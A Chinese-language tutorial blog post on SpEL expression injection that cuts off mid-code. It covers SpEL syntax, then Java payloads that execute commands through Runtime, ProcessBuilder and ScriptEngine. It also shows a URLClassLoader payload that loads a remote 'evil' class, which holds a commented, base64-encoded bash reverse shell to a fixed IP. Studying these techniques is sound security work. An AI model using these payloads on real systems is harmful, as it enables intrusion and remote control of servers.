    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/">https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/</a></p><p><a href="https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</a></p><p><a href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93</a></p><span id="more"></span><hr><h1 id="SPEL表达式基础"><a href="#SPEL表达式基础" class="headerlink" title="SPEL表达式基础"></a>SPEL表达式基础</h1><blockquote><p>在Spring 3中引入了Spring表达式语言（Spring Expression Language，简称SpEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于XML和基于注解的Spring配置还有bean定义一起使用</p></blockquote><p>特性：</p><ul><li>使用Bean的ID来引用Bean</li><li>可调用方法和访问对象的属性</li><li>可对值进行算数、关系和逻辑运算</li><li>可使用正则表达式进行匹配</li><li>可进行集合操作</li></ul><h2 id="定界符"><a href="#定界符" class="headerlink" title="定界符"></a>定界符</h2><p><code>#&#123;&#125;</code>：所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等</p><p>和<code>$&#123;&#125;</code>的区别：</p><ul><li><p><code>#&#123;&#125;</code>就是SpEL的定界符，用于指明内容未SpEL表达式并执行；</p></li><li><p><code>$&#123;&#125;</code>主要用于加载外部属性文件中的值；</p></li><li><p>两者可以混合使用，但是必须<code>#&#123;&#125;</code>在外面，<code>$&#123;&#125;</code>在里面，如<code>#&#123;&#39;$&#123;&#125;&#39;&#125;</code>，注意单引号是字符串类型才添加的</p></li></ul><p>结论：<code>$&#123;&#125;</code>只是单纯的一个占位符，会引起一些注入，比如SQL注入之类的。而<code>#&#123;&#125;</code>这就是SPEL特有的定界符。中间的内容会被解析</p><hr><h2 id="表达式类型"><a href="#表达式类型" class="headerlink" title="表达式类型"></a>表达式类型</h2><h3 id="字面值"><a href="#字面值" class="headerlink" title="字面值"></a>字面值</h3><p>最简单的SpEL表达式就是仅包含一个字面值。</p><p>下面我们在XML配置文件中使用SpEL设置类属性的值为字面值，此时需要用到<code>#&#123;&#125;</code>定界符，注意若是指定为字符串的话需要添加单引号括起来：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message1<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123;666&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message2<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123;'0w0'&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>还可以直接与字符串混用：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>the value is #&#123;666&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Java基本数据类型都可以出现在SpEL表达式中，表达式中的数字也可以使用科学计数法：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>salary<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123;1e4&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="引用Bean、属性和方法"><a href="#引用Bean、属性和方法" class="headerlink" title="引用Bean、属性和方法"></a>引用Bean、属性和方法</h3><p>SpEL 表达式能够通过其他 Bean 的 ID 进行引用，直接在 <code>#&#123;&#125;</code> 符号中写入 ID 名即可，无需添加单引号括起来</p><p>常规写法：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>SpEL中：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123;test&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>引用类属性和引用类方法懒得写了（</p><hr><h3 id="常见的表达式"><a href="#常见的表达式" class="headerlink" title="常见的表达式"></a>常见的表达式</h3><p>一些比较常见的表达式：</p><table><thead><tr><th>运算符类型</th><th>运算符</th></tr></thead><tbody><tr><td>算数运算</td><td>+, -, *, &#x2F;, %, ^</td></tr><tr><td>关系运算</td><td>&lt;, &gt;, &#x3D;&#x3D;, &lt;&#x3D;, &gt;&#x3D;, lt, gt, eq, le, ge</td></tr><tr><td>逻辑运算</td><td>and, or, not, !</td></tr><tr><td>条件运算</td><td>?:(ternary), ?:(Elvis)</td></tr><tr><td>正则表达式</td><td>matches</td></tr></tbody></table><table><thead><tr><th>运算符</th><th>符号</th><th>文本类型</th></tr></thead><tbody><tr><td>等于</td><td>&#x3D;&#x3D;</td><td>eq</td></tr><tr><td>小于</td><td>&lt;</td><td>lt</td></tr><tr><td>小于等于</td><td>&lt;&#x3D;</td><td>le</td></tr><tr><td>大于</td><td>&gt;</td><td>gt</td></tr><tr><td>大于等于</td><td>&gt;&#x3D;</td><td>ge</td></tr></tbody></table><hr><h2 id="变量定义和引用"><a href="#变量定义和引用" class="headerlink" title="变量定义和引用"></a>变量定义和引用</h2><p>在SpEL表达式中，变量定义通过<code>EvaluationContext</code>类的<code>setVariable(variableName, value)</code>函数来实现；在表达式中使用&quot;#variableName&quot;来引用；除了引用自定义变量，SpEL还允许引用根对象及当前上下文对象：</p><ul><li>#this：使用当前正在计算的上下文；</li><li>#root：引用容器的root对象；</li><li>@something：引用Bean</li></ul><hr><h2 id="类型表达式T"><a href="#类型表达式T" class="headerlink" title="类型表达式T()"></a>类型表达式T()</h2><blockquote><p>在 SpEL 表达式中，使用 <code>T(Type)</code> 运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。</p></blockquote><p>使用 <code>T(Type)</code> 来表示 <code>java.lang.Class</code> 实例，Type 必须是类全限定名，但 <code>java.lang</code> 包除外，因为 SpEL 已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段</p><p>值得注意的是，<code>java.lang.Runtime</code> 这个包也是包含于 <code>java.lang</code> 的包的，所以如果能调用 <code>Runtime</code> 就可以进行命令执行</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"T(java.lang.String)"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 创建解析器</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 解析表达式</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 执行</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/19/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240719145300158.png" alt="image-20240719145300158"></p><p>T中的内容会被解析为一个类。比如图中的String，那么当然可以解析为<code>java.lang.Runtime</code>，因此也就有了命令执行</p><p>只需要改为<code>T(java.lang.Runtime).getRuntime().exec(\&quot;calc\&quot;)</code>就能弹计算器</p><hr><h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><h2 id="RCE-ver1——直接RCE"><a href="#RCE-ver1——直接RCE" class="headerlink" title="RCE ver1——直接RCE"></a>RCE ver1——直接RCE</h2><h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"new java.lang.ProcessBuilder(new String[]&#123;\"calc\"&#125;).start()"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建解析器</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解析表达式</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//弹出计算器</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/19/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240719150401829.png" alt="image-20240719150401829"></p><hr><h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"T(java.lang.Runtime).getRuntime().exec('calc')"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建解析器</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解析表达式</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//弹出计算器</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="ScriptEngine"><a href="#ScriptEngine" class="headerlink" title="ScriptEngine"></a>ScriptEngine</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"s=[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);\")"</span><span class="token punctuation">;</span><span class="token comment">// engine也可以用javascript</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建解析器</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解析表达式</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//弹出计算器</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意这里不是<code>T()</code>，因为 <code>getEngineByName</code> 不是 static 方法，不过可以直接new</p><hr><h2 id="RCE-ver2——远程类加载"><a href="#RCE-ver2——远程类加载" class="headerlink" title="RCE ver2——远程类加载"></a>RCE ver2——远程类加载</h2><h3 id="UrlClassloader"><a href="#UrlClassloader" class="headerlink" title="UrlClassloader"></a>UrlClassloader</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">MalformedURLException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"new java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL('http://127.0.0.1:8888/')&#125;).loadClass(\"evil\").newInstance()"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建解析器</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解析表达式</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//弹出计算器</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本地恶意类：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> evil <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//Runtime.getRuntime().exec("bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTE2LjExOS4yNTMvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;");</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="AppClassloader"><a href="#AppClassloader" class="headerlink" title="AppClassloader"></a>AppClassloader</h3><p>获取ClassLoader去加载本地的类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token 